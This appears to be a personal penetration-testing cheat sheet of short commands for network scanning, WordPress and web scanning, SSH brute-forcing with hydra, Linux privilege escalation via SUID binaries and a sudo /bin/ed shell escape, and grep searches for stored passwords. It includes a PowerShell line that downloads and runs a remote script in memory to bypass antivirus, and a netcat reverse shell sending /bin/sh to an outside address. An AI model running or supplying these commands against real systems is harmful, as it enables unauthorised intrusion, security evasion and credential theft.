# tools
few scripts and useful commands

# scan
<ul>
<li>netdiscover -r 192.168.10.130/24</li>
<li>nmap -A -sS 192.168.10.135</li>
<li>nikto -h http://192.168.10.135/site</li>
<li>wapiti http://192.168.10.134/site</li>
<li>wordpress : wpscan --url http://192.168.10.135/site</li>
</ul>

# windows
<p>run ps1 script in memory (bypass antivirus) :</p>
<ul>
<li>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')</li>
</ul>

# bruteforce
<ul>
<li>hydra -l user -P wordlist.txt 192.168.10.130 ssh</li>
</ul>
<p>generate wordlist from a password with 2 missing characters :</p>
<ul>
<li>crunch 7 7 -t passwo^% >> wordlist.txt</li>
</ul>

# privesc

<ul>
<li>find / -perm -u=s -type f 2>/dev/null</li>
<li>find / -perm +6000 2> /dev/null</li>
<li>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</li>
<li> Get a better shell if msf payload is weak (ex: python/reverse_shell) : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet </li>
<li> List rights : sudo -l </li>
<li> Example with /bin/ed : sudo /bin/ed => !/bin/bash => id </li>
<li>ps -ax</li>
</ul>

# shell

<p>LFI</p>
<ul>
<li>/bin/nc 192.168.91.1 1234 -e /bin/sh /bin</li>
<li> https://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref </li>
</ul>

# post-exploitation
<ul>
<li> grep -air --include=*.txt ou .json ou .sh password ou mot de passe </li>
<li> grep -air --include=*.txt "mot de passe" </li>
<li> grep -air --include=*pass* ""</li>
<li>https://matthew-brett.github.io/curious-git/reading_git_objects.html</li>
</ul>
